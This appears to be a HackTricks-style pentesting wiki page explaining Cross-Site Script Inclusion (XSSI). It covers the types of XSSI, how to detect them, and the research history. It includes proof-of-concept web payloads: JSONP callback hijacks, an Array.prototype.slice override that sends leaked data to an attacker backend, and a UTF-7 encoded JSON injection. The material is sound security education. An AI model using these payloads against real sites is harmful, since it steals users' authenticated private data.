# XSSI (Cross-Site Script Inclusion)

{{#include ../banners/hacktricks-training.md}}

## Basic Information

**Cross-Site Script Inclusion (XSSI)** abuses the fact that a page may load a classic script from another origin even though the **Same-Origin Policy (SOP)** prevents the page from directly reading a cross-origin response. If that script contains user-specific data and exposes it through executable JavaScript, the including page may recover the data.<sup>[[1]](#references)</sup>

### Key Characteristics of **XSSI**:

- **Cross-origin inclusion**: Classic scripts can be included across origins, although modern module scripts use CORS.
- **Data Exposure**: Inclusion alone does not reveal the raw response; the response must be executable or otherwise observable through a known callback, global variable, prototype side effect, or a historical parser quirk.
- **Impact on Dynamic JavaScript/JSONP**: **XSSI** is particularly relevant for dynamic JavaScript or **JSON with Padding (JSONP)**. These technologies often use "ambient-authority" information (like cookies) for authentication. When a script request is made to a different host, these credentials (e.g., cookies) are automatically included in the request.
- **Authenticated-data leakage**: An attacker-controlled page includes a script URL on the vulnerable target. If the browser sends the victim's target-site credentials and the response exposes private data as executable JavaScript, the attacker page may capture that data.<sup>[[1]](#references)</sup>

### Types

1. **Static JavaScript** - This represents the conventional form of XSSI.
2. **Static JavaScript with Authentication** - This type is distinct because it requires authentication to access.
3. **Dynamic JavaScript** - Involves JavaScript that dynamically generates content.
4. **Non-JavaScript** - Uses content that is not intended to be JavaScript but is nevertheless interpreted or exposed by a script inclusion primitive.

**The following information summarizes the scip Labs XSSI taxonomy.**<sup>[[1]](#references)</sup>

### Regular XSSI

In this approach, private information is embedded within a globally accessible JavaScript file. Attackers can identify these files using methods like file reading, keyword searches, or regular expressions. Once located, the script containing private information can be included in malicious content, allowing unauthorized access to sensitive data. An example exploitation technique is shown below:

```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script>
  alert(JSON.stringify(confidential_keys[0]))
</script>
```

### Dynamic-JavaScript-based-XSSI and Authenticated-JavaScript-XSSI

These types of XSSI attacks involve confidential information being dynamically added to the script in response to a user's request. Detection can be performed by sending requests with and without cookies and comparing the responses. If the information differs, it may indicate the presence of confidential information. The DetectDynamicJS Burp extension can automate this comparison.<sup>[[1]](#references)[[3]](#references)</sup>

If confidential data is stored in a global variable, it can be exploited using similar methods to those used in Regular XSSI. However, if the confidential data is included in a JSONP response, attackers can hijack the callback function to retrieve the information. This can be done by either manipulating global objects or setting up a function to be executed by the JSONP response, as demonstrated below:

```html
<script>
  var angular = function () {
    return 1
  }
  angular.callbacks = function () {
    return 1
  }
  angular.callbacks._7 = function (leaked) {
    alert(JSON.stringify(leaked))
  }
</script>
<script
  src="https://site.tld/p?jsonp=angular.callbacks._7"
  type="text/javascript"></script>
```

```html
<script>
  leak = function (leaked) {
    alert(JSON.stringify(leaked))
  }
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```

For variables not residing in the global namespace, _prototype tampering_ can sometimes be exploited. This technique leverages JavaScript's design, where code interpretation involves traversing the prototype chain to locate the called property. By overriding certain functions, such as `Array`'s `slice`, attackers can access and leak non-global variables:

```javascript
Array.prototype.slice = function () {
  // leaks ["secret1", "secret2", "secret3"]
  sendToAttackerBackend(this)
}
```

Further details on attack vectors can be found in the work of Security Researcher [Sebastian Lekies](https://twitter.com/slekies), who maintains a list of [vectors](http://sebastian-lekies.de/leak/).<sup>[[2]](#references)</sup>

### Non-Script-XSSI

Takeshi Terada's research introduces another form of XSSI, where Non-Script files, such as CSV, are leaked cross-origin by being included as sources in a `script` tag. Historical instances of XSSI, such as Jeremiah Grossman’s 2006 attack to read a complete Google address book and Joe Walker’s 2007 JSON data leak, highlight the severity of these threats. Additionally, Gareth Heyes describes an attack variant involving UTF-7 encoded JSON to escape the JSON format and execute scripts, effective in certain browsers:<sup>[[1]](#references)</sup>

```javascript
;[
  {
    friend: "luke",
    email:
      "+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-",
  },
]
```

```html
<script
  src="http://site.tld/json-utf7.json"
  type="text/javascript"
  charset="UTF-7"></script>
```

## References

- [1] [XSSI - Cross Site Script Inclusion (scip.ch Labs)](https://www.scip.ch/en/?labs.20160414)
- [2] [Sebastian Lekies - Client-side leak vectors](http://sebastian-lekies.de/leak/)
- [3] [luh2/DetectDynamicJS](https://github.com/luh2/DetectDynamicJS)

{{#include ../banners/hacktricks-training.md}}
